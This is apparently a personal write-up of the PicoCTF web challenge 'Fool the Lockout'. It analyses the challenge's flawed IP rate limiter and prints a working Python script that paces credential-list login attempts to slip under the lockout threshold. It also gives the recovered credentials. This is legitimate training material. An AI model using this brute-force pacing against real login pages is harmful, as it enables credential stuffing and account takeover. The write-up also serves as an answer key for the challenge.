---
title: PicoCTF Fool the Lockout Writeup
description: A writeup of the PicoCTF Fool the Lockout challenge showing a flawed IP-rate-limit bypass.
author: Koussay Dhifi
categories: [Writeups, PicoCTF]
tags: [WebExploitation, PicoCTF, RateLimiting, LogicFlaw]
mermaid: true
---

## Introduction

This is another medium web PicoCTF challenged titled [Fool The Lockout](https://learn.cylabacademy.org/library/743?page=1&category=1&difficulty=2).

The description is as follows:

**Your friend is building a simple website with a login page.
To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.
To test their defense, they’ve:
Created a dummy account with a random username–password pair from public credential lists.
Given you those username and password lists.
Shared the full source code.
Can you bypass the rate limit, log in, and capture the flag?**

Basically we will try to bypass this rate limiting based on our IP address. The question is about that limiter is it well implimented ?

## Recon

We are going to start with manual recon and then source code checking to finish all the pieces of the puzzle.

### Manual Investigation

We are faced with the login form and is asking for a username and a password as shown in the following image.

![Fool the Lockout login](../assets/pico/fool-the-lockout/fool-the-lockout-1.png)

If we try any creds we get the error of username or password being wrong.

If I check the HTML nothing much exists about it.

So let's move to checking the source code.

### Source Code Investigation

The source code logic at first sight seems tight and no bugs or logic errors but there is actually a logical bug so let's analyze the code.

First each client's IP address is stored within a dictionary named requests_rates that has the following structure.

```py
""" format ->
    "ip_addr":{
        "num_requests": int
        "epoch_start": timestamp
        "lockout_until" : int      # -1 if not locked out, timestamp of lockout end
    }
"""
```
Basically each IP address has the number of requests it sent (num_requests) and epoch_start is when that client started sending requests and locked_untill is how many seconds that IP is banned for and if it is not banned it has -1.

The algorithm is based on three variables

```py

MAX_REQUESTS = 10      # max failed attempts before a user is locked out
EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)
LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)
```

`MAX_REQUESTS` variable is for the maximum failed attempts , `LOCKOUT_DURATION` is the length of the IP ban in seconds and for `EPOCH_DURATION` is actually a confusing name. We would understand this variable more if we read more source code.

If we check the `refresh_request_rate` function we would find this code snippet:

```py
    epoch_start_time = request_rates[client_ip]["epoch_start"] 
    if curr_time - epoch_start_time > EPOCH_DURATION:
        request_rates[client_ip]["num_requests"] = 0
        request_rates[client_ip]["epoch_start"] = -1
```

Basically what does the code snippet mean is when we do not insert input for more than EPOCH_DURATION which is 30 seconds our number of requests gets a cooldown and gets initiated to 0.

So what we should do is send around 9-10 consequetive requests sleep for 32 seconds and send more requests untill we find the correct credentials. We currently have 100 creds to try, if we send around 9 requests and cool down for 33 seconds then the dictionary attack will last around 6-7 minutes.

## Payload and Exploitation

The implimentation of the algorithm in python is as follows.

```py
import requests
from bs4 import BeautifulSoup
import time


with open('cred-dump.txt') as f:
	creds = f.readline()
	attempt = 0
	i = 0
	while creds:

		creds = creds.strip()
		creds = creds.split(';')
		print(f"{i}: Trying {creds}")
		i += 1
		r = requests.post("http://candy-mountain.picoctf.net:62917/login", data={"username":creds[0], "password":creds[1]})

		soup = BeautifulSoup(r.text, "html.parser")

		elements = soup.find_all(class_="error-message")
		

		if "<h1>Rate Limited Exceeded</h1><p>You have sent too many requests, requests from your IP will be temporarily blocked.</p>" in r.text:
			print("Blockewna y Bro")
			break

		if (len(elements) == 0) or ("Invalid" not in str(elements[0])):
			with open("result.txt","wt") as f2:
				f2.write(r.text)
				break;

		attempt += 1

		if attempt == 9:
			time.sleep(33)
			attempt = 0
		
		creds = f.readline()
```

The correct creds are `nadir;vides` and we get the flag in the `result.txt`.

```html
<!doctype html>
<html>
<head>
  <title>Silly Little Page</title>
  <link rel="stylesheet" href="/static/index.css">
</head>

<body>
  <div class="container">

    <!-- Header box -->
    <div class="header-box">
      <div class="title-box">
        <h1 id="page-title">Homepage</h1>
      </div>
      <hr>  <!-- light grey line -->

      <div class="welcome-logout">
        <h3 class="welcome-message">Welcome <em>nadir</em></h3>
        <a href="/logout" class="logout-button">Logout</a>
      </div>

      
      <p class="flag-message">picoCTF{f00l_Find_Your_Own}</p>
      
    </div>

  </div>
</body>

</html>
```

## Conclusion

That was a nice challenge that required an understanding of a logic flaw rather than a ready vulnerability.
